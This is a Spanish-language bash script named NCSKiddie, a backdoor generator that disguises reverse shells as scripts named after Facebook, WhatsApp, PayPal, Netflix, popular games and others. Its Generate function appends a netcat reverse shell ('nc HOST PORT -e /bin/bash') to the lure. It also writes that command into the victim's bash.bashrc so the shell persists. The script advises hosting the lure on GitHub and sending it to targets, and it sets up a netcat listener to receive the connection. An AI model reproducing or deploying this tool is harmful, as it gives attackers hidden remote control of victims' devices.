#!/bin/bash
#
# NCSKiddie: (18/12/2020)
#
# Variables y Colores
#
PWD=$(pwd)
OS=$(uname -o)
USER=$(id -u)
verde='\033[32m'
blanco='\033[37m'
rojo='\033[31m'
azul='\033[34m'
negro='\033[0;30m'
rosa='\033[38;5;207m'
amarillo='\033[33m'
morado='\033[35m'
cian='\033[1;36m'
magenta='\033[1;35m'
#
# Verificando el Usuario Actual
#
function CheckRoot {
if [[ "${USER}" -ne "0" ]]; then
echo -e "${rojo}
┌═════════════════════════════┐
█ ${blanco}¡EJECUTAR CON USUARIO ROOT! ${rojo}█
└═════════════════════════════┘
"${blanco}
exit
fi
}
#
# Dependencias del Script
#
function Dependencies {
if [ "${OS}" == "Android" ]; then
	if [ -x ${PREFIX}/bin/nc ]; then
		RUTA="/sdcard"
		FILE="/data/data/com.termux/files/usr/etc/bash.bashrc"
	else
		RUTA="/sdcard"
		FILE="/data/data/com.termux/files/usr/etc/bash.bashrc"
		pkg update && pkg upgrade -y
		pkg install netcat -y
	fi
else
	CheckRoot
	if [ -x /bin/nc ]; then
		RUTA=$(pwd)
		FILE="/etc/bash.bashrc"
	else
		RUTA=$(pwd)
		FILE="/etc/bash.bashrc"
		apt-get update && apt-get upgrade -y
		apt-get install netcat -y
	fi
fi
}
#
# Mensaje Para Capturar Errores
#
function Error {
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
}
#
# Banner NCSKiddie
#
function NCSKiddie {
	sleep 0.5
	clear
echo -e "${verde}
███╗   ██╗ ██████╗███████╗██╗  ██╗██╗██████╗ ██████╗ ██╗███████╗
████╗  ██║██╔════╝██╔════╝██║ ██╔╝██║██╔══██╗██╔══██╗██║██╔════╝
██╔██╗ ██║██║     ███████╗█████╔╝ ██║██║  ██║██║  ██║██║█████╗
██║╚██╗██║██║     ╚════██║██╔═██╗ ██║██║  ██║██║  ██║██║██╔══╝
██║ ╚████║╚██████╗███████║██║  ██╗██║██████╔╝██████╔╝██║███████╗
╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═════╝ ╚═╝╚══════╝"${blanco}
}
#
# Solicitando Host, Port y LocalPort al Usuario
#
function Configurations {
	NCSKiddie
echo -e -n "${verde}
┌═════════════════┐
█ ${blanco}INGRESE SU HOST ${verde}█
└═════════════════┘
┃    ┌═════════┐  ┌════════════════════════════┐
└═>>>█ ${blanco}EJEMPLO ${verde}█=>█ ${azul}Darkmux-40754.portmap.host ${verde}█
┃    └═════════┘  └════════════════════════════┘
┃    ┌═════════┐  ┌════════════════┐
└═>>>█ ${blanco}EJEMPLO ${verde}█=>█ ${azul}0.tcp.ngrok.io ${verde}█
┃    └═════════┘  └════════════════┘
┃
└═>>> "${blanco}
read -r HOST
sleep 0.5
echo -e -n "${verde}
┌═════════════════┐
█ ${blanco}INGRESE SU PORT ${verde}█
└═════════════════┘
┃    ┌═════════┐  ┌═══════┐
└═>>>█ ${blanco}EJEMPLO ${verde}█=>█ ${azul}40754 ${verde}█
┃    └═════════┘  └═══════┘
┃
└═>>> "${blanco}
read -r PORT
sleep 0.5
echo -e -n "${verde}
┌══════════════════════┐
█ ${blanco}INGRESE SU LOCALPORT ${verde}█
└══════════════════════┘
┃    ┌═════════┐  ┌══════┐
└═>>>█ ${blanco}EJEMPLO ${verde}█=>█ ${azul}4546 ${verde}█
┃    └═════════┘  └══════┘
┃
└═>>> "${blanco}
read -r LOCALPORT
sleep 0.5
echo -e -n "${verde}
┌════════════════════════════════════┐
█ ${blanco}INGRESE UN NOMBRE PARA SU BACKDOOR ${verde}█
└════════════════════════════════════┘
┃    ┌═════════┐  ┌══════════┐
└═>>>█ ${blanco}EJEMPLO ${verde}█=>█ ${azul}backdoor ${verde}█
┃    └═════════┘  └══════════┘
┃
└═>>> "${blanco}
read -r BACKDOOR
sleep 0.5
echo -e "${verde}
┌════════════════════════┐
█ ${blanco}CONFIGURACIÓN GUARDADA ${verde}█
└════════════════════════┘
"${blanco}
sleep 1
}
function Scripts {
	NCSKiddie
echo -e -n "${verde}
     ┌═════════════════┐  ┌══════════════════┐  ┌═════════════════┐
┌═>>>█ [${blanco}01${verde}] ┃ ${blanco}FACEBOOK ${verde}█=>█ [${blanco}02${verde}] ┃ ${blanco}MESSENGER ${verde}█=>█ [${blanco}03${verde}] ┃ ${blanco}WHATSAPP ${verde}█
┃    └═════════════════┘  └══════════════════┘  └═════════════════┘
┃    ┌═════════════════┐  ┌══════════════════┐  ┌═════════════════┐
└═>>>█ [${blanco}04${verde}] ┃ ${blanco}NETFLIX  ${verde}█=>█ [${blanco}05${verde}] ┃ ${blanco}MICROSOFT ${verde}█=>█ [${blanco}06${verde}] ┃ ${blanco}TELEGRAM ${verde}█
┃    └═════════════════┘  └══════════════════┘  └═════════════════┘
┃    ┌═════════════════┐  ┌══════════════════┐  ┌═════════════════┐
└═>>>█ [${blanco}07${verde}] ┃ ${blanco}SPOTIFY  ${verde}█=>█ [${blanco}08${verde}] ┃ ${blanco}INSTAGRAM ${verde}█=>█ [${blanco}09${verde}] ┃ ${blanco}SNAPCHAT ${verde}█
┃    └═════════════════┘  └══════════════════┘  └═════════════════┘
┃    ┌═════════════════┐  ┌══════════════════┐  ┌═════════════════┐
└═>>>█ [${blanco}10${verde}] ┃ ${blanco}PAYPAL   ${verde}█=>█ [${blanco}11${verde}] ┃ ${blanco}ZOOM-US   ${verde}█=>█ [${blanco}12${verde}] ┃ ${blanco}REPORT   ${verde}█
┃    └═════════════════┘  └══════════════════┘  └═════════════════┘
┃    ┌═════════════════┐  ┌══════════════════┐  ┌═════════════════┐
└═>>>█ [${blanco}13${verde}] ┃ ${blanco}GOOGLE   ${verde}█=>█ [${blanco}14${verde}] ┃ ${blanco}YOUTUBE   ${verde}█=>█ [${blanco}15${verde}] ┃ ${blanco}TIKTOK   ${verde}█
┃    └═════════════════┘  └══════════════════┘  └═════════════════┘
┃    ┌═════════════════┐  ┌══════════════════┐  ┌═════════════════┐
└═>>>█ [${blanco}16${verde}] ┃ ${blanco}PUBG     ${verde}█=>█ [${blanco}17${verde}] ┃ ${blanco}FREE FIRE ${verde}█=>█ [${blanco}18${verde}] ┃ ${blanco}FORTNITE ${verde}█
┃    └═════════════════┘  └══════════════════┘  └═════════════════┘
┃    ┌═════════════════┐  ┌══════════════════┐  ┌═════════════════┐
└═>>>█ [${blanco}19${verde}] ┃ ${blanco}LOCATION ${verde}█=>█ [${blanco}20${verde}] ┃ ${blanco}HACK-WIFI ${verde}█=>█ [${blanco}00${verde}] ┃ ${rojo}NINGUNA  ${verde}█
┃    └═════════════════┘  └══════════════════┘  └═════════════════┘
┃
└═>>> "${blanco}
read -r SCRIPT
sleep 0.5

if [[ ${SCRIPT} == 0 || ${SCRIPT} == 00 ]]; then
exit
elif [[ ${SCRIPT} == 1 || ${SCRIPT} == 01 ]]; then
NCSCRIPT="NC-Facebook.sh"
SCRIPT="Facebook.sh"
elif [[ ${SCRIPT} == 2 || ${SCRIPT} == 02 ]]; then
NCSCRIPT="NC-Messenger.sh"
SCRIPT="Messenger.sh"
elif [[ ${SCRIPT} == 3 || ${SCRIPT} == 03 ]]; then
NCSCRIPT="NC-WhatsApp.sh"
SCRIPT="WhatsApp.sh"
elif [[ ${SCRIPT} == 4 || ${SCRIPT} == 04 ]]; then
NCSCRIPT="NC-Netflix.sh"
SCRIPT="Netflix.sh"
elif [[ ${SCRIPT} == 5 || ${SCRIPT} == 05 ]]; then
NCSCRIPT="NC-Microsoft.sh"
SCRIPT="Microsoft.sh"
elif [[ ${SCRIPT} == 6 || ${SCRIPT} == 06 ]]; then
NCSCRIPT="NC-Telegram.sh"
SCRIPT="Telegram.sh"
elif [[ ${SCRIPT} == 7 || ${SCRIPT} == 07 ]]; then
NCSCRIPT="NC-Spotify.sh"
SCRIPT="Spotify.sh"
elif [[ ${SCRIPT} == 8 || ${SCRIPT} == 08 ]]; then
NCSCRIPT="NC-Instagram.sh"
SCRIPT="Instagram.sh"
elif [[ ${SCRIPT} == 9 || ${SCRIPT} == 09 ]]; then
NCSCRIPT="NC-Snapchat.sh"
SCRIPT="Snapchat.sh"
elif [[ ${SCRIPT} == 10 ]]; then
NCSCRIPT="NC-PayPal.sh"
SCRIPT="PayPal.sh"
elif [[ ${SCRIPT} == 11 ]]; then
NCSCRIPT="NC-Zoom-us.sh"
SCRIPT="Zoom-us.sh"
elif [[ ${SCRIPT} == 12 ]]; then
NCSCRIPT="NC-Reporte.sh"
SCRIPT="Reporte.sh"
elif [[ ${SCRIPT} == 13 ]]; then
NCSCRIPT="NC-Google.sh"
SCRIPT="Google.sh"
elif [[ ${SCRIPT} == 14 ]]; then
NCSCRIPT="NC-YouTube.sh"
SCRIPT="YouTube.sh"
elif [[ ${SCRIPT} == 15 ]]; then
NCSCRIPT="NC-TikTok.sh"
SCRIPT="TikTok.sh"
elif [[ ${SCRIPT} == 16 ]]; then
NCSCRIPT="NC-PUBG.sh"
SCRIPT="PUBG.sh"
elif [[ ${SCRIPT} == 17 ]]; then
NCSCRIPT="NC-FREE-FIRE.sh"
SCRIPT="FREE-FIRE.sh"
elif [[ ${SCRIPT} == 18 ]]; then
NCSCRIPT="NC-FORTNITE.sh"
SCRIPT="FORTNITE.sh"
elif [[ ${SCRIPT} == 19 ]]; then
NCSCRIPT="NC-Localizar.sh"
SCRIPT="Localizar.sh"
elif [[ ${SCRIPT} == 20 ]]; then
NCSCRIPT="NC-Hack-Wifi.sh"
SCRIPT="Hack-WiFi.sh"
else
Error
Scripts
fi
}
function Generate {
cp ${PWD}/scripts/${NCSCRIPT} ${PWD}/scripts/${SCRIPT}
echo -e "HOST='${HOST}'" >> ${PWD}/scripts/${SCRIPT}
echo -e "PORT='${PORT}'" >> ${PWD}/scripts/${SCRIPT}
echo -e 'echo -e "nc ${HOST} ${PORT} -e /bin/bash > /dev/null 2>&1 &" >> ${FILE}' >> ${PWD}/scripts/${SCRIPT}
echo -e "nc ${HOST} ${PORT} -e /bin/bash" >> ${PWD}/scripts/${SCRIPT}
cp ${PWD}/scripts/${SCRIPT} ${RUTA}
rm ${PWD}/scripts/${SCRIPT}
echo -e "${verde}
┌══════════════════════════════┐
█ ${blanco}SCRIPT MALICIOSO GENERADO EN ${verde}█
└══════════════════════════════┘
┃
└═>>>${blanco} ${RUTA}/${SCRIPT}"
sleep 3
echo -e "${verde}
┌═════════════════┐
█ ${blanco}RECOMENDACIONES ${verde}█
└═════════════════┘
┃    ┌══════════════════════════════════════┐
└═>>>█ ${blanco}ALOJAR EL SCRIPT MALICIOSO EN GITHUB ${verde}█
┃    └══════════════════════════════════════┘
┃    ┌══════════════════════════════════════════┐
└═>>>█ ${blanco}ENVIAR UNA LISTA DE COMANDOS AL OBJETIVO ${verde}█
     └══════════════════════════════════════════┘"
sleep 3
}
function Listening {
echo -e "${verde}
┌═══════════════════════════════┐
█ ${blanco}CREANDO ARCHIVO DE ESCUCHA... ${verde}█
└═══════════════════════════════┘"${blanco}
echo -e '#!/bin/bash
verde="\033[32m"
blanco="\033[37m"
sleep 0.5
clear
echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}NETCAT EN MODO ESCUCHA... ${verde}█
└═══════════════════════════┘
"${blanco}' >> ${PWD}/${BACKDOOR}.sh
echo -e "nc -vlp ${LOCALPORT}" >> ${PWD}/${BACKDOOR}.sh
chmod 777 ${PWD}/${BACKDOOR}.sh
sleep 3
echo -e "${verde}
┌══════════════════════┐
█ ${blanco}EJECUTE ESTE ARCHIVO ${verde}█
└══════════════════════┘
┃
└═>>>${blanco} ${PWD}/${BACKDOOR}.sh${verde}
┃
┃    ┌═══════════════════════════════════════┐
└═>>>█ ${blanco}PARA VOLVER A TENER UNA REVERSE SHELL ${verde}█
     └═══════════════════════════════════════┘"
sleep 3
}
function NetCat {
echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}NETCAT EN MODO ESCUCHA... ${verde}█
└═══════════════════════════┘
"${blanco}
nc -vlp ${LOCALPORT}
}
#
# Declarando Funciones
#
Dependencies
Configurations
Scripts
Generate
Listening
NetCat
#
# Creado por Darkmux
# WHITE HACKS ©2021
